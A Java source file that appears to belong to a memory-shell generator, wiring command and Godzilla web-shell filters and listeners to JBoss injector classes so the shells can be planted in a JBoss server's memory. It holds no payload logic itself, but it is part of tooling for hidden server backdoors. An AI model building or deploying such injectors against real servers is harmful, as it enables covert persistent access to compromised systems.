package com.reajason.javaweb.memshell;

import com.reajason.javaweb.config.Constants;
import com.reajason.javaweb.config.ShellTool;
import com.reajason.javaweb.memshell.jboss.command.CommandListener;
import com.reajason.javaweb.memshell.jboss.godzilla.GodzillaListener;
import com.reajason.javaweb.memshell.jboss.injector.JbossFilterInjector;
import com.reajason.javaweb.memshell.jboss.injector.JbossListenerInjector;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilter;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilter;
import org.apache.commons.lang3.tuple.Pair;

import java.util.List;
import java.util.Map;

/**
 * @author ReaJason
 * @since 2024/12/10
 */
public class JbossShell extends AbstractShell {

    @Override
    public List<ShellTool> getSupportedShellTools() {
        return List.of(ShellTool.Command, ShellTool.Godzilla);
    }

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getCommandShellMap() {
        return Map.of(
                Constants.FILTER, Pair.of(CommandFilter.class, JbossFilterInjector.class),
                Constants.LISTENER, Pair.of(CommandListener.class, JbossListenerInjector.class)
        );
    }

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getGodzillaShellMap() {
        return Map.of(
                Constants.FILTER, Pair.of(GodzillaFilter.class, JbossFilterInjector.class),
                Constants.LISTENER, Pair.of(GodzillaListener.class, JbossListenerInjector.class)
        );
    }
}